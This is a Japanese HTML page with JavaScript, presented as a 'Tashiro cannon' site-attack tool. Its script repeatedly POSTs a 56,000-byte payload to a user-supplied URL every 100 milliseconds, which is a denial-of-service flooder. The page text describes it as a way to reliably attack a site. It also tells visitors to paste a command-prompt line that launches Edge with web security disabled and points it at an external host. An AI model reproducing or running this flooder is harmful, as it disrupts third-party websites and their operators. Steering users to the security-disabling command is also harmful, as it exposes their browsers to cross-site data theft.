<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>最強田代砲</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: black; /* 背景色を黒に設定 */
            color: white; /* 字の色を白に設定 */
        }
        input, button {
            margin: 5px;
        }
        #results {
            margin-top: 20px;
        }
        pre {
            background-color: #222; /* コードブロックの背景 */
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto; /* 横スクロール */
        }
    </style>
</head>
<body>
    <h1>超 田代砲</h1>
    <label for="url">テストするURL:</label>
    <input type="text" id="url" placeholder="example.com">
    
    <button id="startTest">発射</button>
    <button id="stopTest" disabled>停止</button>
    
    <div id="results"></div>
    
    <p>確実にそのサイトに攻撃する方法</p>
    <p>1. Windows(のマーク)キー+Rキーを同時押しする。</p>
    <p>2. cmdと入力して検索する。</p>
    <p>3. コマンドプロンプトが開く。下記のコードをコピペして実行する。</p>
    
    <pre id="commandText">
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --disable-web-security --user-data-dir=C:\Windows\Temp http://tyoutasirohou.onrender.com/

    </pre>
    <script>
        let intervalId;
        let isRunning = false;

        document.getElementById('startTest').addEventListener('click', function() {
            const url = document.getElementById('url').value;
            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML = ''; // 結果をクリア

            if (!url) {
                resultsDiv.innerHTML = '<p>URLを入力してください。</p>';
                return;
            }

            const sendData = new Array(56000).fill('A').join(''); // 56000バイトのデータを作成
            isRunning = true;

            document.getElementById('startTest').disabled = true; // 発射ボタンを無効化
            document.getElementById('stopTest').disabled = false; // 停止ボタンを有効化

            // 定期的にリクエストを送信
            intervalId = setInterval(() => {
                fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ data: sendData })
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                })
                .catch(err => {
                    console.error('Error:', err);
                });
            }, 100); // 100ミリ秒ごとにリクエストを送信
        });

        document.getElementById('stopTest').addEventListener('click', function() {
            clearInterval(intervalId); // インターバルをクリア
            isRunning = false;

            document.getElementById('startTest').disabled = false; // 発射ボタンを再有効化
            document.getElementById('stopTest').disabled = true; // 停止ボタンを無効化

            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML += '<p>テストが停止しました。</p>'; // 停止メッセージを表示
        });
    </script>
</body>
</html>
